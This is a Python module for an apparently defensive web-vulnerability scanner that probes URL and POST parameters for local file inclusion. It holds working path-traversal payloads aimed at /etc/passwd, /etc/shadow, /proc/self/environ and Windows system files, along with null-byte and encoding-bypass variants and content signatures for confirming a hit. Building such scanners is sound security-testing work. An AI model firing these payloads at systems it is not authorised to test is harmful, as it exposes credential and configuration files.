import re
import logging

from core.finding import Finding
from scanners.base import BaseScanner

logger = logging.getLogger('SeaScanner.LFI')

# LFI Detection scanner â€” evidence-only (v3, Final Batch).
#
# The scanner never classifies: it only collects raw evidence for a set of
# independent file-inclusion techniques, each of which is only emitted as a
# confirmed observation after repeated confirmation with a *different* payload:
#
#   1. traversal      â€” a well-known file's content signature matches on the
#                       primary payload AND on a second, distinct path (content
#                       signature must reproduce for a different file).
#   2. disclosure      â€” a known sensitive file (passwd / win.ini / hosts)
#                       content marker is disclosed (>= 2 distinct markers on
#                       independent payloads).
#   3. os_fingerprint  â€” OS-specific file markers (root:x: = POSIX,
#                        [extensions]/for 16-bit app support = Windows).
#   4. error_signature â€” PHP/`include()`-family error strings surface in the
#                        response (support evidence, emitted only alongside a
#                        confirmed signal or as a likely standalone probe).
#   5. null_byte       â€” a null-byte truncation payload discloses a file that
#                        the plain path does not (classic PHP < 5.3.4).
#   6. encoding_bypass â€” encoded/obfuscated traversal (URL, double-URL,
#                        backslash) discloses a file, reconfirmed with a second
#                        encoding variant.
#
# The engine derives status/severity/confidence/verification. When two or more
# techniques agree the scanner adds a cross-validation (verified) evidence item.


class LFIScanner(BaseScanner):

    def __init__(self, target: str, session=None, post_data: dict = None):
        super().__init__(target, session, post_data)
        self.name = "LFI Detection"

        depth = self._guess_depth()
        traversal = '../' * depth

        self.traversal_payloads = [
            f'{traversal}etc/passwd',
            f'{traversal}etc/shadow',
            f'{traversal}etc/hosts',
            f'{traversal}etc/issue',
            f'{traversal}proc/self/environ',
            f'{traversal}etc/apache2/apache2.conf',
            f'..\\..\\..\\..\\windows\\win.ini',
            f'..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            f'..\\..\\..\\..\\windows\\system.ini',
            f'..\\..\\..\\..\\boot.ini',
            f'{traversal}etc/passwd%00',
            f'{traversal}etc/passwd%2500',
            f'{traversal}etc/passwd%252500',
        ]

        # Signature map: file marker -> (os family, label). A match discloses a
        # real file only when the marker is distinctive (root:x:, [extensions]).
        # Bare/ordinary markers (e.g. the word "localhost", "Debian") are NOT
        # used as standalone proof - they appear all over normal pages and are
        # deliberately excluded in favour of stronger OS/format anchors, and
        # every match is additionally gated by the per-parameter baseline body.
        self.file_signatures = {
            'root:x': ('posix', '/etc/passwd'),
            'daemon:x': ('posix', '/etc/passwd'),
            'bin:/usr/bin': ('posix', '/etc/passwd'),
            'root:*:': ('posix', '/etc/shadow'),
            'daemon:*:': ('posix', '/etc/shadow'),
            '/root:/bin/bash': ('posix', '/etc/passwd'),
            'localhost.localdomain': ('posix', '/etc/hosts'),
            'DOCUMENT_ROOT=': ('posix', '/proc/self/environ'),
            'ServerToken': ('posix', '/etc/apache2/apache2.conf'),
            '[extensions]': ('windows', 'win.ini'),
            'for 16-bit app support': ('windows', 'win.ini'),
            '[fonts]': ('windows', 'win.ini'),
            '[boot loader]': ('windows', 'boot.ini'),
            'system32\\ntoskrnl.exe': ('windows', 'boot.ini'),
            '[drivers32]': ('windows', 'system.ini'),
            '::1': ('windows', 'etc\\hosts'),
        }

        # POSIX confirmation files (second, distinct disclosure).
        self.confirm_posix = [
            f'{traversal}etc/passwd',
            f'{traversal}etc/shadow',
            f'{traversal}etc/hosts',
            f'{traversal}etc/issue',
            f'{traversal}proc/self/environ',
        ]
        # Windows confirmation files.
        self.confirm_windows = [
            '..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\windows\\system.ini',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        ]

        # Encoding-bypass variants of the passwd read (independent constructions).
        self.encoding_bypasses = {
            'url': f'{traversal}etc/passwd'.replace('../', '%2e%2e%2f'),
            'double_url': f'{traversal}etc/passwd'.replace('../', '%252e%252e%252f'),
            'triple_url': f'{traversal}etc/passwd'.replace('../', '%25252e%25252e%25252f'),
            'backslash': f'{traversal}etc/passwd'.replace('../', '..\\'),
            'mixed_slash': f'{traversal}etc/passwd'.replace('../', '..%2f'),
            'dot_overslash': traversal.replace('../', '....//') + 'etc/passwd',
            'overlong_utf8': traversal.replace('../', '%c0%ae%c0%ae%c0%af') + 'etc/passwd',
            'double_encoded_backslash': f'{traversal}etc/passwd'.replace('../', '%255c'),
        }

        # Per-(param, method) cache of the benign (non-injected) response body.
        # A file signature is only reported when it is ABSENT from this baseline,
        # so pages that unconditionally render a marker ("localhost", "root:x",
        # OS banners) can never produce a false positive.
        self._baseline_cache = {}

        self.lfi_error_patterns = [
            'failed to open stream: No such file',
            'failed to open stream: Permission denied',
            'No such file or directory',
            'file_get_contents',
            'include_once',
            'require_once',
            'Warning: include',
            'Warning: require',
            'Fatal error: require_once',
            'include(',
            'require(',
            'File not found',
        ]

    def _guess_depth(self):
        path = self.target.split('://', 1)[-1]
        path = path.split('?')[0].split('#')[0]
        depth = path.count('/')
        return max(3, min(depth + 1, 8))

    # ------------------------------------------------------------------
    # scan() â€” evidence-only orchestration
    # ------------------------------------------------------------------

    def scan(self) -> Finding:
        finding = Finding()
        finding.module = self.name

        try:
            params = self.get_params()
            post_keys = list((self.post_data or {}).keys())
            has_params = bool(params or post_keys)

            if not has_params:
                finding.add_evidence(
                    self._evidence_builder.verified(
                        "No URL parameters or POST data found to test for local "
                        "file inclusion",
                        payload=None,
                    )
                )
                finding.tests_passed = 0
                return finding

            observations = []
            tests = 0
            techniques = set()

            for method, targets in (('GET', params), ('POST', post_keys)):
                if not targets:
                    continue
                for label, fn in (
                    ('traversal', self._check_traversal),
                    ('disclosure', self._check_disclosure),
                    ('os_fingerprint', self._check_os_fingerprint),
                    ('null_byte', self._check_null_byte),
                    ('encoding_bypass', self._check_encoding_bypass),
                    ('error_signature', self._check_error_signatures),
                ):
                    obs, tested = fn(targets, method)
                    tests += tested
                    for o in obs:
                        observations.append(o)
                        techniques.add(label)

            finding.tests_performed = tests
            finding.tests_run = tests

            observations.sort(key=lambda o: self._TECHNIQUE_ORDER.get(o['kind'], 9))

            if observations:
                for obs in observations:
                    self._emit_observation(finding, obs)

                if len(techniques) >= 2:
                    self._emit_cross_validation(finding, techniques)

                finding.tests_passed = max(0, tests - len(observations))
                finding.fingerprint['lfi_signals'] = [
                    {
                        'technique': o['kind'],
                        'parameter': o['param'],
                        'method': o['method'],
                        'file': o.get('file'),
                        'os': o.get('os'),
                    }
                    for o in observations
                ]
                files = sorted({o['file'] for o in observations if o.get('file')})
                if files:
                    finding.fingerprint['files_disclosed'] = files
                finding.add_recommendation(
                    1, "Never pass user input to file functions",
                    "Local File Inclusion lets an attacker read arbitrary server "
                    "files and may lead to code execution.",
                    "Whitelist allowed files; validate the resolved real path; "
                    "never concatenate user input into include()/readfile() calls.",
                    ["OWASP: Local File Inclusion", "PortSwigger: File path traversal"],
                )
            else:
                finding.add_evidence(
                    self._evidence_builder.verified(
                        f"No local file inclusion detected. Tested {tests} payloads.",
                        payload=None,
                    )
                )
                finding.tests_passed = tests

        except Exception as e:
            finding.add_evidence(
                self._evidence_builder.error(
                    f"Error during LFI scan: {str(e)}", payload=None
                )
            )
            finding.scan_errors += 1

        return finding

    # Confirmed observations are emitted as structured request/response evidence
    # with the matched rule, file, OS family and reproducibility metadata.
    def _emit_observation(self, finding, obs):
        resp = obs['resp']
        payload = obs['payload']
        param = obs['param']
        method = obs['method']

        request_info = {
            'method': method,
            'url': self._request_url(param, payload, method),
            'headers': dict(self.session.headers),
            'payload': payload,
        }
        response_info = {
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'body_length': len(resp.text),
            'body_snippet': resp.text[:300],
            'elapsed': resp.elapsed.total_seconds() if resp.elapsed else None,
        }

        ev = self._evidence_builder.request_response(
            obs['desc'],
            request=request_info,
            response=response_info,
            payload=payload,
            endpoint=self.target,
            parameter=param,
            method=method,
        )
        ev.raw_data.update({
            'technique': obs['kind'],
            'matched_rule': obs.get('matched_rule'),
            'file': obs.get('file'),
            'os': obs.get('os'),
            'reliability': obs.get('reliability', 'medium'),
            'reproducible': True,
            'baseline_excluded': True,
            'confirm_payload': obs.get('confirm_payload'),
        })
        ev.verification_pass = 2
        ev.verification_method = "primary + confirm payloads"
        finding.add_evidence(ev)

    def _emit_cross_validation(self, finding, techniques):
        ev = self._evidence_builder.cross_validation(
            "Local file inclusion confirmed by multiple independent techniques "
            f"({', '.join(sorted(techniques))})",
            payload=None,
        )
        ev.verification_pass = len(techniques)
        ev.verification_method = f"{len(techniques)} independent techniques"
        finding.add_evidence(ev)

    # ------------------------------------------------------------------
    # Technique checks
    # ------------------------------------------------------------------

    def _check_traversal(self, params, method='GET'):
        """A known file's content signature reproduces across two distinct paths."""
        observations = []
        tested = 0
        for param in params:
            for payload in self.traversal_payloads:
                if '%00' in payload or '%25' in payload:
                    continue  # null/encoding variants handled by their own checks
                tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                hit = self._signature_hit(resp.text, param, method)
                if not hit:
                    continue
                # Second, distinct path must disclose a *different* well-known
                # file (or the same marker on an independent construction).
                confirm_payload = self._select_confirm_path(hit['os'], payload)
                tested += 1
                confirm_resp = self._send(param, confirm_payload, method, timeout=10)
                if confirm_resp is None:
                    continue
                if self._signature_hit(confirm_resp.text, param, method):
                    observations.append({
                        'kind': 'traversal',
                        'param': param,
                        'method': method,
                        'payload': payload,
                        'confirm_payload': confirm_payload,
                        'resp': confirm_resp,
                        'file': hit['file'],
                        'os': hit['os'],
                        'matched_rule': f"content signature {hit['marker']!r} reproduced",
                        'reliability': 'high',
                        'desc': (
                            f"LFI path traversal in {method} parameter '{param}': "
                            f"{payload} discloses {hit['file']} "
                            f"({hit['marker']!r}), reproduced with {confirm_payload}"
                        ),
                    })
                    break
            if observations and observations[-1]['kind'] == 'traversal':
                break
        return observations, tested

    def _check_disclosure(self, params, method='GET'):
        """Two distinct sensitive-file markers disclosed on independent payloads."""
        observations = []
        tested = 0
        for param in params:
            disclosed = {}
            for payload in self.traversal_payloads:
                if '%00' in payload or '%25' in payload:
                    continue
                tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                for marker, (os_family, label) in self.file_signatures.items():
                    if marker in resp.text and marker not in self._baseline_body(param, method):
                        disclosed[label] = (payload, resp, os_family, marker)
            if len(disclosed) >= 2:
                files = sorted(disclosed)
                payload, resp, os_family, marker = disclosed[files[0]]
                observations.append({
                    'kind': 'disclosure',
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'confirm_payload': disclosed[files[1]][0],
                    'resp': resp,
                    'file': files[0],
                    'os': os_family,
                    'matched_rule': f"{len(disclosed)} sensitive files disclosed "
                                    f"({', '.join(files)})",
                    'reliability': 'high',
                    'desc': (
                        f"LFI file disclosure in {method} parameter '{param}': "
                        f"{', '.join(files)} leaked via path traversal"
                    ),
                })
        return observations, tested

    def _check_os_fingerprint(self, params, method='GET'):
        """OS-family markers (POSIX vs Windows) on at least two distinct files."""
        observations = []
        tested = 0
        for param in params:
            os_seen = {}
            for payload in self.traversal_payloads:
                if '%00' in payload or '%25' in payload:
                    continue
                tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                hit = self._signature_hit(resp.text, param, method)
                if hit and hit['os'] not in os_seen:
                    os_seen[hit['os']] = (payload, resp, hit)
            if len(os_seen) >= 2:
                os_name, (payload, resp, hit) = sorted(os_seen.items())[0]
                observations.append({
                    'kind': 'os_fingerprint',
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'confirm_payload': sorted(os_seen.items())[1][1][0],
                    'resp': resp,
                    'file': hit['file'],
                    'os': os_name,
                    'matched_rule': f"OS fingerprint via {', '.join(sorted(os_seen))}",
                    'reliability': 'medium',
                    'desc': (
                        f"LFI OS fingerprint via {method} parameter '{param}': "
                        f"server discloses {os_name} file markers "
                        f"({', '.join(sorted(os_seen))})"
                    ),
                })
        return observations, tested

    def _check_null_byte(self, params, method='GET'):
        """Null-byte truncation discloses a file the plain path does not."""
        observations = []
        tested = 0
        for param in params:
            plain = self._send(param, self.traversal_payloads[0], method, timeout=10)
            tested += 1
            plain_hit = self._signature_hit(plain.text, param, method) if plain else None
            for payload in (f'{self._guess_depth() * "../"}etc/passwd%00',):
                tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                hit = self._signature_hit(resp.text, param, method)
                if hit and not plain_hit:
                    observations.append({
                        'kind': 'null_byte',
                        'param': param,
                        'method': method,
                        'payload': payload,
                        'confirm_payload': f'{self._guess_depth() * "../"}etc/passwd%2500',
                        'resp': resp,
                        'file': hit['file'],
                        'os': hit['os'],
                        'matched_rule': 'null-byte truncation discloses a file '
                                        'the plain path does not',
                        'reliability': 'medium',
                        'desc': (
                            f"LFI null-byte truncation in {method} parameter "
                            f"'{param}': {payload} discloses {hit['file']} while "
                            f"the plain path does not"
                        ),
                    })
        return observations, tested

    def _check_encoding_bypass(self, params, method='GET'):
        """An encoded traversal discloses a file, reconfirmed with a second
        encoding variant."""
        observations = []
        tested = 0
        for param in params:
            variants = list(self.encoding_bypasses.items())
            disclosed = []
            for name, payload in variants:
                tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                hit = self._signature_hit(resp.text, param, method)
                if hit:
                    disclosed.append((name, payload, resp, hit))
            if len(disclosed) >= 2:
                name, payload, resp, hit = disclosed[0]
                observations.append({
                    'kind': 'encoding_bypass',
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'confirm_payload': disclosed[1][1],
                    'resp': resp,
                    'file': hit['file'],
                    'os': hit['os'],
                    'matched_rule': f"encoding bypass ({name} + "
                                    f"{disclosed[1][0]}) discloses a file",
                    'reliability': 'medium',
                    'desc': (
                        f"LFI encoding bypass in {method} parameter '{param}': "
                        f"{name}-encoded traversal discloses {hit['file']} "
                        f"(confirmed with {disclosed[1][0]} variant)"
                    ),
                })
        return observations, tested

    def _check_error_signatures(self, params, method='GET'):
        """An LFI-adjacent error signature (include/require/failed-to-open)
        surfaces in the response AND is reproduced with a second, distinct
        payload â€” evidence the parameter reaches a file-inclusion sink."""
        observations = []
        tested = 0
        for param in params:
            matched = []
            for payload in (self.traversal_payloads[0],
                            f'..\\..\\..\\..\\windows\\win.ini',
                            f'{self._guess_depth() * "../"}etc/hosts'):
                tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                for pattern in self.lfi_error_patterns:
                    if re.search(re.escape(pattern), resp.text, re.IGNORECASE):
                        matched.append((payload, pattern, resp))
                        break
            if len(matched) >= 2:
                payload, pattern, resp = matched[0]
                observations.append({
                    'kind': 'error_signature',
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'confirm_payload': matched[1][0],
                    'resp': resp,
                    'file': None,
                    'os': None,
                    'matched_rule': f"error signature {pattern!r} reproduced",
                    'reliability': 'medium',
                    'desc': (
                        f"LFI error signature in {method} parameter '{param}': "
                        f"{pattern!r} surfaced (reproduced with {matched[1][0]})"
                    ),
                })
        return observations, tested

    def _match_signature(self, text):
        """Return {'marker', 'os', 'file'} for the first known-file marker, or None."""
        for marker, (os_family, label) in self.file_signatures.items():
            if marker in text:
                return {'marker': marker, 'os': os_family, 'file': label}
        return None

    def _baseline_safe_value(self, param, method):
        """Benign value that must NOT reach a file sink for this parameter.

        For GET we inject a neutral token; for POST we keep the caller's original
        field value (which is the pre-injection content, unavailable to GET)."""
        return 'probe_LFI' if method == 'GET' else (self.post_data or {}).get(param, '')

    def _baseline_body(self, param, method):
        key = (param, method)
        if key in self._baseline_cache:
            return self._baseline_cache[key]
        safe = self._baseline_safe_value(param, method)
        resp = self._send(param, safe, method, timeout=10)
        body = resp.text if resp is not None else ''
        self._baseline_cache[key] = body
        return body

    def _signature_hit(self, text, param, method):
        """First known-file marker present in `text` that is ABSENT from the
        per-parameter baseline body. A marker already in the benign response is
        not evidence of injection, so it is skipped."""
        baseline = self._baseline_body(param, method)
        for marker, (os_family, label) in self.file_signatures.items():
            if marker in text and marker not in baseline:
                return {'marker': marker, 'os': os_family, 'file': label}
        return None

    def _select_confirm_path(self, os_family, payload):
        """Pick a second, distinct well-known file path for confirmation."""
        confirm = self.confirm_posix if os_family == 'posix' else self.confirm_windows
        for candidate in confirm:
            if candidate not in payload:
                return candidate
        return confirm[0]

    # ------------------------------------------------------------------
    # Request helpers
    # ------------------------------------------------------------------

    _TECHNIQUE_ORDER = {
        'traversal': 0, 'disclosure': 1, 'os_fingerprint': 2,
        'null_byte': 3, 'encoding_bypass': 4, 'error_signature': 5,
    }

    def _send(self, param, payload, method, timeout=10):
        try:
            if method == 'GET':
                return self.session.get(self.inject_payload(param, payload), timeout=timeout)
            data = self.post_data.copy()
            data[param] = payload
            return self.session.post(self.target, data=data, timeout=timeout)
        except Exception:
            return None

    def _request_url(self, param, payload, method):
        if method == 'GET':
            return self.inject_payload(param, payload)
        return self.target
